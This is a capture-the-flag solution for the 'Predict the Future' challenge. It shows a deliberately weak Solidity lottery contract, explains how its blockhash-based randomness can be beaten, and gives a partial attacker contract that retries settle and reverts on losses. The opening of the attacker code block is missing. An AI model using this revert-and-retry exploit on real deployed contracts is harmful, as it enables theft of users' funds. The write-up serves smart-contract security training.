# Capture the Ether (RareSkills Repo) - Predict the Future - Solution

## Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}
```

## Exploit

Note that `answer` has to be an integer between 0 and 9 because it is computed modulo 10. Therefore, we can lock in any guess, e.g., 0, and spam the contract by calling `settle` multiple times across multiple blocks. Notice that because `settle` will reset `guesser` to the zero address, we need to ensure the transaction reverts if we guessed wrong. (Otherwise, we'd be required to always call `lockInGuess` before calling `settle`. In particular, we'd be required to pay 1 ether for each attempt, making our spamming strategy unprofitable.)

We can conveniently execute this attack in Remix using the attacker contract below.

NOTE: `lockInGuess` must be called via the attacker contract to pass `require(msg.sender == guesser)` during settlement.

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    receive() external payable {}

    function lockInGuess() external payable {
        predictTheFuture.lockInGuess{value: 1 ether}(0);
    }

    function attack() external {
        predictTheFuture.settle();
        require(predictTheFuture.isComplete(), "Exploit failed");
    }
}
```
